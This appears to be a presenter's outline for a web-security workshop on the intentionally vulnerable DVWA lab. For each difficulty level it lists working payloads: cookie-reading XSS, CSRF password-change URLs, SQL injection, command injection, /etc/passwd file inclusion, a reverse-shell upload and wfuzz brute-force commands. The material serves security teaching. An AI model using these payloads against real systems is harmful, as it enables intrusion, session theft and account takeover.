Приветствие
Алексей
Работаю
Занимаюсь безопасностью контейнерных перевозок
Веду канал Ever Secure, подписывайтесь, много чего интересного
Один из ведущих подкаста SafeCode Live
Член программного комитета DevOops Conf и SafeCode conf


о чем поговориv сегодня?
Почему это важно и зачем это нужно?

Tools
https://owasp.org/www-project-top-ten/

# запускаем
docker run --name dvwa --rm -it -p 80:80 vulnerables/web-dvwa
localhost:80
admin changeme
# создаем базу
admin password

## JS
### JS low
cyber chef
rot 13 -> md5
Вопросы?

## XSS
### XSS low
<script>alert(1)</script>
<script>alert(document.cookie)</script>

### XSS med
<ScRiPt>alert(document.cookie)</ScRiPt>

### XSS high
<img src=123.png onerror="alert(document.cookie)">

## XSS Stored
### XSS Stored low
<script>alert(1)</script>

### XSS Stored med
in name + field value
<ScRiPt>alert(document.cookie)</ScRiPt>

### XSS Stored high
in name + field value
<img src=123.png onerror="alert(document.cookie)">

## DOM XSS #показа
### DOM XSS low
http://localhost/vulnerabilities/xss_d/?default=<script>alert(document.cookie);</script>

### DOM XSS med
></option></select><img src=x onerror="alert(document.cookie)">

### DOM XSS high
#<script>alert(document.cookie);</script>

## CSRF
### CSRF low
http://localhost/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change#

### CSRF med
wia XSS stored low into img src=
http://localhost/vulnerabilities/csrf/?password_new=12345&password_conf=12345&Change=Change

### CSRF high
http://localhost/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=5fd825be4f58dc95c8e0464383092e5e#

!!!! ПЕРЕРЫВ !!!!

## SQLi
### SQLi low
1' or 1=1#
' UNION SELECT user, password FROM users#
### SQLi med
value
1 or 1=1
### SQLi high
' UNION SELECT user, password FROM users#

## Blind SQLi
### Blind SQLi low
1' and sleep(5)#



## Comand Injection
### Comand Injection low
;ls
;whoami
;cd /
### Command injection med
|ls
### Command injection high
|ls

## File Inclusion
### File Inclusion low
/etc/passwd
### File Inclusion med
/etc/passwd
### File Inclusion high
=file:/../../../../etc/passwd
file:////etc/passwd

### SSRF low
docker exec dvwa sed -i 's/allow_url_include = Off/allow_url_include = On/g' /etc/php/7.0/apache2/php.ini
docker exec dvwa /etc/init.d/apache2 reload
=http://192.168.1.1

## File upload (Insecure Deserealisation)
### File upload low
upload reverse shell
192.168.1.3/hackable/uploads/rev.php

### File upload med
Change content type
Content-Type: image/jpeg
192.168.1.3/hackable/uploads/rev2.php

## Brute Force
### Bruteforce low
Burp

cd ~/Documents/rebrain
docker run -v $(pwd):/wordlist/ -it ghcr.io/xmendez/wfuzz wfuzz --hs "incorrect" -c -z file,users.txt -z file,top1k.txt -b 'PHPSESSID=a69jg832lb836778vtcpgsuig0; security=low' 'http://192.168.1.3/vulnerabilities/brute/?username=FUZZ&password=FUZ2Z&Login=Login'
### Bruteforce low
docker run -v $(pwd):/wordlist/ -it ghcr.io/xmendez/wfuzz wfuzz -c -z file,users.txt -z file,top1k.txt -b 'PHPSESSID=daietf6d2h5jv8ol6mvvjafak7; security=medium' 'http://192.168.1.3/vulnerabilities/brute/?username=FUZZ&password=FUZ2Z&Login=Login'

docker run -v $(pwd):/wordlist/ -it ghcr.io/xmendez/wfuzz wfuzz -c -z file,users.txt -z file,top1k.txt -b 'PHPSESSID=daietf6d2h5jv8ol6mvvjafak7; security=low' 'http://192.168.1.3/vulnerabilities/brute/?username=FUZZ&password=FUZ2Z&Login=Login'
### Bruteforce high
intruder -> type Pitchfork -> add fields -> payload 1 -> settings -> allow redirect -> grep extract -> payload 2



## Used tools
Docker engine - https://docs.docker.com/engine/install/
DVWA - https://github.com/digininja/DVWA
DVWA image - https://hub.docker.com/r/vulnerables/web-dvwa
Burp Suite CE - https://portswigger.net/burp/communitydownload
top 1k common passwords - https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top1000.txt
wfuzz - https://github.com/xmendez/wfuzz
OWASP top 10 - https://owasp.org/www-project-top-ten/

## links
common passwords - https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials
https://owasp.org
https://portswigger.net/web-security
